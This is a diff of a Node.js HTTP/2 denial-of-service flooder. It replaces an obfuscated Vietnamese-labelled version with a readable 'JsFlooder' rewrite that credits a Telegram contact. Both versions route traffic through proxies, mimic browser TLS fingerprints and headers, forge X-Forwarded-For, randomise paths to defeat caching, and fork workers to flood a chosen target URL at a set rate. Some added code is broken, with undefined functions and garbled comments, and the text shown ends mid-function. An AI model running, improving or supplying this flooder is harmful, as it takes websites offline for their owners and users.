@@ -1,1 +1,654 @@
-const a0_0x5733b1=a0_0x5477;function a0_0x5ef3(){const _0x257740=['floor','fork','[THÔNG\x20TIN]\x20User-Agent:\x20','Cách\x20dùng:','timeout','default','không\x20có','random','TLS_AES_256_GCM_SHA384','tls','SSL_OP_NO_TLSv1_1',':443\x20HTTP/1.1\x0d\x0aHost:\x20','TLS_CHACHA20_POLY1305_SHA256','toFixed','COLOR_GREEN','setNoDelay','protocol','argv','\x20<target>\x20<duration>\x20<threads>\x20<proxy>\x20<rate>\x20<cookies>\x20<userAgent>','http2','setTimeout','SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION','TLS_AES_128_CCM_SHA256','subresource','cross-site','COLOR_YELLOW','\x1b[32m','length','setKeepAlive','284889AuGTRY','max-age=0','[THÔNG\x20TIN]\x20Tốc\x20độ:\x20','red','COLOR_RED','same-origin','\x20yêu\x20cầu/giây','[THÔNG\x20TIN]\x20Hoàn\x20tất\x20flood\x20','ecdsa_secp384r1_sha384','yellowBright','SSL_OP_NO_SSLv3','HTTP','225816AzncpK','stringify','write','TLS_AES_128_CCM_8_SHA256',':443\x0d\x0aConnection:\x20Keep-Alive\x0d\x0a\x0d\x0a','unknown','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','1597032JAhVrT','\x20tới\x20','error','SSL_OP_NO_TLSv1_3','cluster','7anfpjS','response','must-revalidate','blueBright','parse','rsa_pss_rsae_sha256','\x20với\x20','chalk','document','split','3688130oKCKDT','TLS_method','23pLUJXy','8rZItkW','no-cache','node\x20','SSL_OP_CIPHER_SERVER_PREFERENCE','allowHalfOpen','[LỖI]\x20URL\x20phải\x20bắt\x20đầu\x20bằng\x20http://\x20hoặc\x20https://','443','join','HTTP/1.1\x20200','log','https','no-store','Lỗi:\x20Hết\x20thời\x20gian\x20chờ','5252VyGBLN','href','[LỖI]\x20Lỗi\x20yêu\x20cầu:\x20','vi-VN,vi;q=0.9','SSL_OP_PKCS1_CHECK_1','gzip,\x20deflate,\x20br','rsa_pss_rsae_sha512','[LỖI]\x20','GREASE:X25519:x25519:P-256:P-384:P-521:X448','destroy','slice','CONNECT\x20','from','2626542glbGee','totalmem','GET','path','es-ES,es;q=0.8','Lỗi\x20kết\x20nối\x20proxy:\x20','https:','freemem','[THÔNG\x20TIN]\x20Hết\x20thời\x20gian!\x20Dọn\x20dẹp...','SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION','exit','host','1404205sFkPIg','SSL_OP_LEGACY_SERVER_CONNECT',':443','unhandledRejection','[THÔNG\x20TIN]\x20Đang\x20chạy...','cors','includes','address','ALPN_ENABLED','[LỖI]\x20Lỗi\x20HTTP/2:\x20','setMaxListeners','settings','[THÔNG\x20TIN]\x20Luồng:\x20','rsa_pkcs1_sha384','workers','request','SSL_OP_NO_SSLv2','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','cyanBright','port','SSL_OP_NO_TLSv1','[THÔNG\x20TIN]\x20Cookies:\x20','\x20yêu\x20cầu','end','rsa_pkcs1_sha512','message','rsa_pss_rsae_sha384','SSL_OP_PKCS1_CHECK_2','kill','[THÔNG\x20TIN]\x20Mục\x20tiêu:\x20','defaultCoreCipherList','none','cf-nel','en-US,en;q=0.9','connect','constants','redBright','[THÔNG\x20TIN]\x20Thời\x20gian:\x20'];a0_0x5ef3=function(){return _0x257740;};return a0_0x5ef3();}(function(_0x1ebd58,_0x595c08){const _0x54b5f0=a0_0x5477,_0x2c05aa=_0x1ebd58();while(!![]){try{const _0x269599=parseInt(_0x54b5f0(0x155))/0x1*(-parseInt(_0x54b5f0(0x163))/0x2)+parseInt(_0x54b5f0(0x131))/0x3*(parseInt(_0x54b5f0(0x156))/0x4)+-parseInt(_0x54b5f0(0x17c))/0x5+parseInt(_0x54b5f0(0x13d))/0x6+parseInt(_0x54b5f0(0x149))/0x7*(parseInt(_0x54b5f0(0x144))/0x8)+-parseInt(_0x54b5f0(0x170))/0x9+parseInt(_0x54b5f0(0x153))/0xa;if(_0x269599===_0x595c08)break;else _0x2c05aa['push'](_0x2c05aa['shift']());}catch(_0x1c6ba0){_0x2c05aa['push'](_0x2c05aa['shift']());}}}(a0_0x5ef3,0x27c6f));const net=require('net'),http2=require(a0_0x5733b1(0x127)),tls=require(a0_0x5733b1(0x11d)),cluster=require(a0_0x5733b1(0x148)),url=require('url'),crypto=require('crypto'),chalk=require(a0_0x5733b1(0x150)),defaultCiphers=crypto[a0_0x5733b1(0x111)][a0_0x5733b1(0x10c)][a0_0x5733b1(0x152)](':'),ciphers='GREASE:'+[defaultCiphers[0x2],defaultCiphers[0x1],defaultCiphers[0x0],...defaultCiphers[a0_0x5733b1(0x16d)](0x3)][a0_0x5733b1(0x15d)](':'),sigalgs=['ecdsa_secp256r1_sha256',a0_0x5733b1(0x14e),'rsa_pkcs1_sha256',a0_0x5733b1(0x139),a0_0x5733b1(0x108),a0_0x5733b1(0xfb),a0_0x5733b1(0x169),a0_0x5733b1(0x106)][a0_0x5733b1(0x15d)](':'),ecdhCurve=a0_0x5733b1(0x16b),secureOptions=crypto[a0_0x5733b1(0x111)][a0_0x5733b1(0xfe)]|crypto[a0_0x5733b1(0x111)][a0_0x5733b1(0x13b)]|crypto[a0_0x5733b1(0x111)][a0_0x5733b1(0x102)]|crypto[a0_0x5733b1(0x111)][a0_0x5733b1(0x11e)]|crypto[a0_0x5733b1(0x111)][a0_0x5733b1(0x147)]|crypto[a0_0x5733b1(0x111)][a0_0x5733b1(0xf6)]|crypto[a0_0x5733b1(0x111)][a0_0x5733b1(0x179)]|crypto[a0_0x5733b1(0x111)][a0_0x5733b1(0x159)]|crypto[a0_0x5733b1(0x111)][a0_0x5733b1(0x17d)]|crypto['constants']['SSL_OP_COOKIE_EXCHANGE']|crypto[a0_0x5733b1(0x111)][a0_0x5733b1(0x167)]|crypto['constants'][a0_0x5733b1(0x109)]|crypto[a0_0x5733b1(0x111)]['SSL_OP_SINGLE_DH_USE']|crypto[a0_0x5733b1(0x111)]['SSL_OP_SINGLE_ECDH_USE']|crypto['constants'][a0_0x5733b1(0x129)],secureProtocol=a0_0x5733b1(0x154),secureContext=tls['createSecureContext']({'ciphers':ciphers,'sigalgs':sigalgs,'honorCipherOrder':!![],'secureOptions':secureOptions,'secureProtocol':secureProtocol}),accept_header=[a0_0x5733b1(0x143),'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',a0_0x5733b1(0xff)],cache_header=[a0_0x5733b1(0x157),a0_0x5733b1(0x161),a0_0x5733b1(0x14b),a0_0x5733b1(0x132)],language_header=[a0_0x5733b1(0x10f),a0_0x5733b1(0x166),'fr-FR,fr;q=0.8',a0_0x5733b1(0x174)],fetch_site=['same-origin',a0_0x5733b1(0x12c),a0_0x5733b1(0x10d)],fetch_mode=['navigate',a0_0x5733b1(0x136),a0_0x5733b1(0x181)],fetch_dest=[a0_0x5733b1(0x151),a0_0x5733b1(0x12b),a0_0x5733b1(0x142)],cplist=[a0_0x5733b1(0x140),a0_0x5733b1(0x12a),a0_0x5733b1(0x120),a0_0x5733b1(0x11c),'TLS_AES_128_GCM_SHA256'],errorHandler=_0x39d8a3=>console[a0_0x5733b1(0x146)](chalk[a0_0x5733b1(0x134)](a0_0x5733b1(0x16a)+_0x39d8a3[a0_0x5733b1(0x107)]));process['on']('uncaughtException',errorHandler),process['on'](a0_0x5733b1(0x17f),errorHandler);const colors={'COLOR_RED':'\x1b[31m','COLOR_GREEN':a0_0x5733b1(0x12e),'COLOR_YELLOW':'\x1b[33m','COLOR_RESET':'\x1b[0m'};function colored(_0x33be61,_0x264c35){const _0x5047a0=a0_0x5733b1;console[_0x5047a0(0x15f)](_0x33be61+_0x264c35+colors['COLOR_RESET']);}function generateRandomString(_0x5ee8a9,_0x17b1cf){const _0x31b02f=a0_0x5733b1,_0x1988cb='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',_0x3be92b=Math[_0x31b02f(0x114)](Math[_0x31b02f(0x11b)]()*(_0x17b1cf-_0x5ee8a9+0x1))+_0x5ee8a9;return Array['from']({'length':_0x3be92b},()=>_0x1988cb[Math[_0x31b02f(0x114)](Math['random']()*_0x1988cb[_0x31b02f(0x12f)])])[_0x31b02f(0x15d)]('');}function randomElement(_0x46ce6b){const _0x172242=a0_0x5733b1;return _0x46ce6b[Math['floor'](Math[_0x172242(0x11b)]()*_0x46ce6b[_0x172242(0x12f)])];}class NetSocket{constructor(){}[a0_0x5733b1(0x13c)](_0x414a1c,_0x10410f){const _0x4fe1a0=a0_0x5733b1,_0x509c29=_0x414a1c[_0x4fe1a0(0xf5)][_0x4fe1a0(0x152)](':'),_0x4ee209=_0x509c29[0x0],_0x4d1998=_0x4fe1a0(0x16e)+_0x414a1c[_0x4fe1a0(0xf5)]+_0x4fe1a0(0x11f)+_0x414a1c[_0x4fe1a0(0xf5)]+_0x4fe1a0(0x141),_0x731ed=Buffer[_0x4fe1a0(0x16f)](_0x4d1998),_0x40953d=net[_0x4fe1a0(0x110)]({'host':_0x414a1c[_0x4fe1a0(0x17b)],'port':_0x414a1c[_0x4fe1a0(0x101)]});_0x40953d[_0x4fe1a0(0x128)](_0x414a1c[_0x4fe1a0(0x118)]*0x927c0),_0x40953d[_0x4fe1a0(0x130)](!![],0x927c0),_0x40953d[_0x4fe1a0(0x123)](!![]),_0x40953d['on'](_0x4fe1a0(0x110),()=>{const _0xaa25e6=_0x4fe1a0;_0x40953d[_0xaa25e6(0x13f)](_0x731ed);}),_0x40953d['on']('data',_0x4a7787=>{const _0x4adae3=_0x4fe1a0,_0x2a9a4a=_0x4a7787['toString']('utf-8'),_0x55165d=_0x2a9a4a[_0x4adae3(0x182)](_0x4adae3(0x15e));if(!_0x55165d)return _0x40953d['destroy'](),_0x10410f(undefined,'Lỗi:\x20Phản\x20hồi\x20không\x20hợp\x20lệ\x20từ\x20proxy');return _0x10410f(_0x40953d,undefined);}),_0x40953d['on']('timeout',()=>{const _0x1bed4a=_0x4fe1a0;return _0x40953d[_0x1bed4a(0x16c)](),_0x10410f(undefined,_0x1bed4a(0x162));}),_0x40953d['on'](_0x4fe1a0(0x146),_0xd6ce28=>{const _0x3b88bb=_0x4fe1a0;return _0x40953d[_0x3b88bb(0x16c)](),_0x10410f(undefined,_0x3b88bb(0x175)+_0xd6ce28[_0x3b88bb(0x107)]);});}}const Socker=new NetSocket();function runFlooder(_0x5207ee,_0x39a40b,_0x29cc1c,_0x4baba7,_0x2c35b9,_0x98634c){const _0x1e8397=a0_0x5733b1,_0x38cd6d=url[_0x1e8397(0x14d)](_0x5207ee),_0x48954a=_0x39a40b[_0x1e8397(0x152)](':'),_0x201b13=_0x38cd6d[_0x1e8397(0x124)]===_0x1e8397(0x176)?_0x1e8397(0x15c):'80',_0x1a6785={'host':_0x48954a[0x0],'port':~~_0x48954a[0x1],'address':_0x38cd6d[_0x1e8397(0x17b)]+_0x1e8397(0x17e),'timeout':0x1};Socker['HTTP'](_0x1a6785,(_0xbfafd7,_0x4746ec)=>{const _0x487dc1=_0x1e8397;if(_0x4746ec){colored(colors['COLOR_RED'],'[LỖI]\x20'+_0x4746ec);return;}_0xbfafd7[_0x487dc1(0x130)](!![],0x927c0),_0xbfafd7[_0x487dc1(0x123)](!![]);const _0x4bdd45={'port':_0x201b13,'secure':!![],'ALPNProtocols':['h2'],'ciphers':randomElement(cplist),'sigalgs':sigalgs,'requestCert':!![],'socket':_0xbfafd7,'ecdhCurve':ecdhCurve,'honorCipherOrder':![],'rejectUnauthorized':![],'secureOptions':secureOptions,'secureContext':secureContext,'host':_0x38cd6d[_0x487dc1(0x17b)],'servername':_0x38cd6d[_0x487dc1(0x17b)],'secureProtocol':secureProtocol},_0x48f0d8=tls[_0x487dc1(0x110)](_0x201b13,_0x38cd6d[_0x487dc1(0x17b)],_0x4bdd45);_0x48f0d8[_0x487dc1(0x15a)]=!![],_0x48f0d8[_0x487dc1(0x123)](!![]),_0x48f0d8[_0x487dc1(0x130)](!![],0x927c0),_0x48f0d8[_0x487dc1(0xf8)](0x0);const _0x59bf19=http2[_0x487dc1(0x110)](_0x38cd6d[_0x487dc1(0x164)],{'createConnection':()=>_0x48f0d8,'settings':{'headerTableSize':0x100000,'maxHeaderListSize':0x100000,'initialWindowSize':0x7fffffff,'maxFrameSize':0x10000}});_0x59bf19[_0x487dc1(0xf8)](0x0),_0x59bf19[_0x487dc1(0xf9)]({'enablePush':![],'initialWindowSize':0x8ca6bff}),_0x59bf19['on'](_0x487dc1(0x110),()=>{let _0x3b6014=0x0;const _0x21c490=setInterval(()=>{const _0x34ffd9=a0_0x5477;for(let _0x12b774=0x0;_0x12b774<_0x2c35b9;_0x12b774++){const _0x48cefd={':authority':_0x38cd6d['host'],':scheme':_0x34ffd9(0x160),':path':_0x38cd6d[_0x34ffd9(0x173)]+'?'+generateRandomString(0x3,0x5)+'='+generateRandomString(0xa,0x19),':method':_0x34ffd9(0x172),'user-agent':_0x4baba7,'accept':randomElement(accept_header),'accept-encoding':randomElement([_0x34ffd9(0x168),'compress,\x20gzip','deflate,\x20gzip']),'accept-language':randomElement(language_header),'cache-control':randomElement(cache_header),'sec-fetch-mode':randomElement(fetch_mode),'sec-fetch-site':randomElement(fetch_site),'sec-fetch-dest':randomElement(fetch_dest),..._0x29cc1c&&{'cookie':_0x29cc1c},'x-forwarded-for':_0x48954a[0x0],'nel':JSON[_0x34ffd9(0x13e)]({'report_to':Math['random']()<0.5?_0x34ffd9(0x10e):_0x34ffd9(0x119),'max-age':Math[_0x34ffd9(0x11b)]()<0.5?0x1e13380:0x2713e8,'include_subdomains':Math[_0x34ffd9(0x11b)]()<0.5})},_0x5f1ac4=_0x59bf19[_0x34ffd9(0xfd)](_0x48cefd,{'parent':0x0,'exclusive':!![],'weight':0xdc});_0x5f1ac4['on'](_0x34ffd9(0x14a),()=>{const _0x520706=_0x34ffd9;_0x5f1ac4['close'](),_0x5f1ac4['destroy'](),_0x3b6014++,colored(colors[_0x520706(0x12d)],'[THÔNG\x20TIN]\x20Đã\x20gửi\x20yêu\x20cầu\x20'+_0x3b6014+_0x520706(0x145)+_0x5207ee);}),_0x5f1ac4['on'](_0x34ffd9(0x146),_0x31c09f=>{const _0x429bd3=_0x34ffd9;colored(colors['COLOR_RED'],_0x429bd3(0x165)+_0x31c09f[_0x429bd3(0x107)]),_0x5f1ac4[_0x429bd3(0x16c)]();}),_0x5f1ac4[_0x34ffd9(0x105)]();}},0x64);setTimeout(()=>{const _0x5d8a5e=a0_0x5477;clearInterval(_0x21c490),_0x59bf19['destroy'](),_0x48f0d8['destroy'](),_0xbfafd7[_0x5d8a5e(0x16c)](),colored(colors[_0x5d8a5e(0x12d)],_0x5d8a5e(0x138)+_0x5207ee+_0x5d8a5e(0x14f)+_0x3b6014+_0x5d8a5e(0x104));},_0x98634c*0x3e8);}),_0x59bf19['on']('error',_0x551a3f=>{const _0x295b97=_0x487dc1;colored(colors['COLOR_RED'],_0x295b97(0xf7)+_0x551a3f[_0x295b97(0x107)]),_0x59bf19['destroy'](),_0x48f0d8[_0x295b97(0x16c)](),_0xbfafd7[_0x295b97(0x16c)]();}),_0x59bf19['on'](_0x487dc1(0x118),()=>{const _0x9852be=_0x487dc1;_0x59bf19[_0x9852be(0x16c)](),_0x48f0d8[_0x9852be(0x16c)](),_0xbfafd7['destroy']();});});}function a0_0x5477(_0x1b7884,_0x4190b6){const _0x5ef304=a0_0x5ef3();return a0_0x5477=function(_0x54779d,_0x1d3fd4){_0x54779d=_0x54779d-0xf5;let _0x14f3e5=_0x5ef304[_0x54779d];return _0x14f3e5;},a0_0x5477(_0x1b7884,_0x4190b6);}if(cluster['isMaster']){process[a0_0x5733b1(0x125)][a0_0x5733b1(0x12f)]<0x9&&(console['clear'](),console[a0_0x5733b1(0x15f)]('\x0a'+chalk[a0_0x5733b1(0x100)]('CÔNG\x20CỤ\x20FLOOD\x20BROWSER\x20HTTP/2\x20BY\x20VLADIMIR\x20')+'\x20|\x20Cập\x20nhật:\x2029/09/2025\x0a\x0a'+chalk[a0_0x5733b1(0x14c)](a0_0x5733b1(0x117))+'\x0a\x20\x20'+chalk[a0_0x5733b1(0x112)](a0_0x5733b1(0x158)+process[a0_0x5733b1(0x125)][0x1]+a0_0x5733b1(0x126))+'\x0a\x20\x20'+chalk[a0_0x5733b1(0x13a)]('Ví\x20dụ:\x20node\x20'+process[a0_0x5733b1(0x125)][0x1]+'\x20https://example.com\x2060\x202\x20192.168.1.1:8080\x2050\x20\x22cookie1=value1;\x20cookie2=value2\x22\x20\x22BROWSER-V3.0/...\x22')+'\x0a'),process['exit'](0x1));const targetURL=process[a0_0x5733b1(0x125)][0x2],duration=parseInt(process['argv'][0x3]),threads=parseInt(process[a0_0x5733b1(0x125)][0x4]),proxy=process[a0_0x5733b1(0x125)][0x5],rate=parseInt(process[a0_0x5733b1(0x125)][0x6]),cookies=process[a0_0x5733b1(0x125)][0x7],userAgent=process[a0_0x5733b1(0x125)][0x8];!/^https?:\/\//i['test'](targetURL)&&(colored(colors[a0_0x5733b1(0x135)],a0_0x5733b1(0x15b)),process[a0_0x5733b1(0x17a)](0x1));colored(colors['COLOR_GREEN'],a0_0x5733b1(0x180)),colored(colors[a0_0x5733b1(0x122)],a0_0x5733b1(0x10b)+targetURL),colored(colors[a0_0x5733b1(0x122)],a0_0x5733b1(0x113)+duration+'\x20giây'),colored(colors['COLOR_GREEN'],a0_0x5733b1(0xfa)+threads),colored(colors['COLOR_GREEN'],'[THÔNG\x20TIN]\x20Proxy:\x20'+proxy),colored(colors[a0_0x5733b1(0x122)],a0_0x5733b1(0x133)+rate+a0_0x5733b1(0x137)),colored(colors['COLOR_GREEN'],a0_0x5733b1(0x103)+(cookies||a0_0x5733b1(0x11a))),colored(colors['COLOR_GREEN'],a0_0x5733b1(0x116)+userAgent);const MAX_RAM_PERCENTAGE=0x63,RESTART_DELAY=0x3e8,handleRAMUsage=()=>{const _0x571e46=a0_0x5733b1,_0x4abacb=require('os')[_0x571e46(0x171)](),_0x2226c2=_0x4abacb-require('os')[_0x571e46(0x177)](),_0x814350=_0x2226c2/_0x4abacb*0x64;if(_0x814350>=MAX_RAM_PERCENTAGE){colored(colors[_0x571e46(0x135)],'[LỖI]\x20RAM\x20sử\x20dụng\x20vượt\x20ngưỡng:\x20'+_0x814350[_0x571e46(0x121)](0x2)+'%');for(const _0x15860e in cluster[_0x571e46(0xfc)]){cluster[_0x571e46(0xfc)][_0x15860e][_0x571e46(0x10a)]();}setTimeout(()=>{const _0x5e232e=_0x571e46;for(let _0x57cab5=0x1;_0x57cab5<=threads;_0x57cab5++){cluster[_0x5e232e(0x115)]();}},RESTART_DELAY);}};setInterval(handleRAMUsage,0x1388);for(let counter=0x1;counter<=threads;counter++){cluster[a0_0x5733b1(0x115)]();}setTimeout(()=>{const _0x1db9e5=a0_0x5733b1;colored(colors[_0x1db9e5(0x12d)],_0x1db9e5(0x178)),process['exit'](0x0);},duration*0x3e8);}else{const targetURL=process[a0_0x5733b1(0x125)][0x2],duration=parseInt(process['argv'][0x3]),proxy=process['argv'][0x5],rate=parseInt(process[a0_0x5733b1(0x125)][0x6]),cookies=process[a0_0x5733b1(0x125)][0x7],userAgent=process[a0_0x5733b1(0x125)][0x8];setInterval(()=>runFlooder(targetURL,proxy,cookies,userAgent,rate,duration),0x64);}
+const url = require('url')
+	, fs = require('fs')
+	, http2 = require('http2')
+	, http = require('http')
+	, tls = require('tls')
+	, net = require('net')
+	, request = require('request')
+	, cluster = require('cluster')
+ randReferer = require('random-referer')
+ const rand = randReferer.getRandom()
+const ua = require('user-agents');
+const crypto = require('crypto');
+const currentTime = new Date();
+const os = require("os");
+const httpTime = currentTime.toUTCString();
+const errorHandler = error => {
+console.log(error);
+};
+process.on("uncaughtException", errorHandler);
+process.on("unhandledRejection", errorHandler);
+try {
+	let colors = require('colors');
+} catch (err) {
+	console.log('\x1b[36mInstalling\x1b[37m the requirements');
+	execSync('npm install colors');
+	console.log('Done.');
+	process.exit();
+}
+/*cplist = [
+		'TLS_AES_128_CCM_8_SHA256',
+		'TLS_AES_128_CCM_SHA256',
+		'TLS_AES_256_GCM_SHA384',
+		'TLS_AES_128_GCM_SHA256'
+		, ]*/
+cplist = [
+		'GREASE:TLS_AES_128_GCM_SHA256',
+		'TLS_AES_256_GCM_SHA384',
+		'TLS_CHACHA20_POLY1305_SHA256',
+		'ECDHE-ECDSA-AES128-GCM-SHA256',
+		'ECDHE-RSA-AES128-GCM-SHA256',
+		'ECDHE-ECDSA-AES256-GCM-SHA384',
+		'ECDHE-RSA-AES256-GCM-SHA384',
+		'ECDHE-ECDSA-CHACHA20-POLY1305',
+		'ECDHE-RSA-CHACHA20-POLY1305',
+		'ECDHE-RSA-AES128-SHA',
+		'ECDHE-RSA-AES256-SHA',
+		'AES128-GCM-SHA256',
+		'AES256-GCM-SHA384',
+		'AES128-SHA',
+		'AES256-SHA',
+		'TLS_AES_128_CCM_8_SHA256',
+		'TLS_AES_128_CCM_SHA256'
+		, ]
+
+		const sigalgs = [
+			"ecdsa_secp256r1_sha256",
+			"rsa_pss_rsae_sha256",
+			"rsa_pkcs1_sha256",
+			"ecdsa_secp384r1_sha384",
+			"rsa_pss_rsae_sha384",
+			"rsa_pkcs1_sha384",
+			"rsa_pss_rsae_sha512",
+			"rsa_pkcs1_sha512",
+		  ];
+		  let concu = sigalgs.join(':');
+controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
+	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
+	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
+const headerFunc = {
+	cipher() {
+		return cplist[Math.floor(Math.random() * cplist.length)];
+	} ,
+	sigalgs() {
+		return sigalgs[Math.floor(Math.random() * sigalgs.length)];
+	  }
+, }
+
+process.on('uncaughtException', function(e) {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).on('unhandledRejection', function(e) {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).on('warning', e => {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).setMaxListeners(0);
+function randomIp() {
+	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
+	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
+	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
+	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
+	return `${segment1}.${segment2}.${segment3}.${segment4}`;
+}
+const generateRandomString = (minLength, maxLength) => {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+    return Array.from({ length }, () => 
+        characters[Math.floor(Math.random() * characters.length)]
+    ).join('');
+};
+const target = process.argv[2];
+const time = process.argv[3];
+const thread = process.argv[4];
+let proxyFile = process.argv[5];
+const rps = process.argv[6];
+let parsed = url.parse(target);
+
+let input = 'flood';
+let query = 'query';
+// Validate input
+if (!target || !time || !thread || !proxyFile || !rps || !input) {
+console.log("JsFlooder with JsBrowser - t.me/bixd08")
+	process.exit(1);
+}
+// Validate target format
+if (!/^https?:\/\//i.test(target)) {
+	console.error('sent with http:// or https://');
+	process.exit(1);
+}
+// Parse proxy list
+proxyr = proxyFile
+// Validate RPS value
+if (isNaN(rps) || rps <= 0) {
+	console.error('number rps');
+	process.exit(1);
+}
+          const searchEngines = [
+    'https://www.google.com',
+    'https://www.bing.com',
+    'https://search.yahoo.com',
+    'https://www.duckduckgo.com',
+    'https://www.baidu.com',
+    'https://www.yandex.com',
+    'https://www.ecosia.org',
+    'https://www.qwant.com',
+    'https://www.startpage.com',
+    'https://www.ask.com'
+];
+
+// Ch?n ng?u nhi�n 1 domain
+const randomEngine = searchEngines[Math.floor(Math.random() * searchEngines.length)];
+const argsa = process.argv.slice(2);
+const queryIndexa = argsa.indexOf('--post');
+post = queryIndexa !== -1 ? argsa[queryIndexa + 1] : null;
+const argsb = process.argv.slice(2);
+const queryIndexg = argsb.indexOf('--query');
+query = queryIndexg !== -1 ? argsb[queryIndexg + 1] : null;
+const argstos = process.argv.slice(2);
+const queryIndextos = argstos.indexOf('--debug');
+debug = queryIndextos !== -1 ? argstos[queryIndextos + 1] : null;
+const argstco = process.argv.slice(2);
+
+cookie = process.argv[7]
+useragent = process.argv[8]
+
+let method, path;
+if (parsed.path.includes('%rand%')) {
+    pathl = parsed.path.replace("/%rand%", generateRandomString(5, 7))
+    if (query === 'true') {
+        path = pathl + "/" + generateRandomString(5, 10) + (Math.random() < 0.5 ? "?" + generateRandomString(5, 10) : "")
+    } else if (query === "query") {
+        path = pathl + "?s=" + generateRandomString(5, 10)
+    } else {
+        path = pathl
+    }
+} else {
+    pathl = parsed.path
+    if (query === 'true') {
+        path = pathl + "/" + generateRandomString(5, 10) + (Math.random() < 0.5 ? "?" + generateRandomString(5, 10) : "")
+    } else if (query === "query") {
+        path = pathl + "?s=" + generateRandomString(5, 10)
+    } else {
+        path = pathl
+    }
+}
+
+if (post === 'true') {
+    method = {
+        ":method": "POST",
+        "content-length": "0"
+    };
+} else if (post === 'random') {
+    method = {
+        ":method": httpMethods[Math.floor(Math.random() * httpMethods.length)],
+    }
+} else {
+    method = {
+        ":method": "GET",
+    }
+}
+const validkey = generateRandomString(5, 10);
+
+function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+// Hàm logic để phân tích User-Agent và tạo các header liên quan (Client Hints)
+function parseUserAgent(uaString) {
+    // Regex để extract browser, version, OS, và mobile flag
+    const browserRegex = /(Chrome|Firefox|Safari|Edge|Opera)\/([\d.]+)/;
+    const osRegex = /\(([^;]+);(?:\s?([^;]+);?)?(?:\s?([^)]+))?\)/;
+    const mobileRegex = /Mobile/;
+
+    // Extract browser và version
+    const browserMatch = uaString.match(browserRegex);
+    const browser = browserMatch ? browserMatch[1] : 'Unknown';
+    const fullVersion = browserMatch ? browserMatch[2] : '0'; // Lấy full version
+    const majorVersion = fullVersion.split('.')[0]; // Major version
+
+    // Extract OS/platform
+    const osMatch = uaString.match(osRegex);
+    let platform = 'Unknown';
+    let platformVersion = '';
+    if (osMatch) {
+        if (osMatch[1].includes('Windows')) {
+            platform = 'Windows';
+        } else if (osMatch[1].includes('Macintosh')) {
+            platform = 'macOS';
+        } else if (osMatch[1].includes('Linux') && osMatch[2] && osMatch[2].includes('Android')) {
+            platform = 'Android';
+            platformVersion = osMatch[3] || ''; // Android version nếu có
+        } else if (osMatch[1].includes('Linux')) {
+            platform = 'Linux';
+        } else if (osMatch[1].includes('iPhone') || osMatch[1].includes('iPad')) {
+            platform = 'iOS';
+        }
+    }
+
+    // Check nếu là mobile
+    const isMobile = mobileRegex.test(uaString) ? '?1' : '?0';
+
+    // Construct sec-ch-ua (dựa trên Chrome format, có thể điều chỉnh cho browser khác)
+    let secChUa = '';
+    if (browser === 'Chrome') {
+        secChUa = `"Chromium";v="${majorVersion}", "Not)A;Brand";v="24", "Google Chrome";v="${majorVersion}"`; // "24" là ví dụ cho Not)A;Brand
+    } else {
+        // Có thể thêm logic cho browser khác, ví dụ Firefox: `"Gecko";v="${majorVersion}"`
+        secChUa = `"${browser}";v="${majorVersion}"`;
+    }
+
+    // sec-ch-ua-full-version-list
+    const secChUaFullVersionList = `"Chromium";v="${fullVersion}", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="${fullVersion}"`;
+
+    // sec-ch-ua-platform (trong ngoặc kép)
+    const secChUaPlatform = `"${platform}"`;
+
+    // sec-ch-ua-mobile
+    const secChUaMobile = isMobile;
+
+    // sec-ch-ua-platform-version nếu có (cho Android/iOS)
